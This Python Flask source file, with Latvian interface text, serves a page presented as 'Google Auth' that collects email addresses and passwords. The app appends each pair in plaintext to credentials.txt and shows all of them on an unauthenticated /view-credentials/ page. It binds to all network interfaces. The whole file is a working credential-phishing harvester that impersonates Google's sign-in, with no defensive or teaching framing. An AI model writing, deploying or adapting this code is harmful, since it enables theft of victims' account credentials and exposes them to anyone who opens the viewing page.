from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return 'Ej uz <a href="/google-auth/">Google Auth</a>'

@app.route('/google-auth/', methods=['GET', 'POST'])
def google_auth():
    message = None
    error = None
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        if not email or not password:
            error = "Lūdzu, aizpildi abus laukus."
        else:
            try:
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Email: {email} | Password: {password}\n")
                message = "Paldies! Dati saglabāti."
            except Exception as e:
                error = f"Kļūda saglabājot datus: {e}"

    return render_template('google-auth.html', message=message, error=error)

@app.route('/view-credentials/')
def view_credentials():
    try:
        with open('credentials.txt', 'r', encoding='utf-8') as f:
            data = f.read()
    except FileNotFoundError:
        data = "Nav saglabātu datu."
    return f"<pre>{data}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
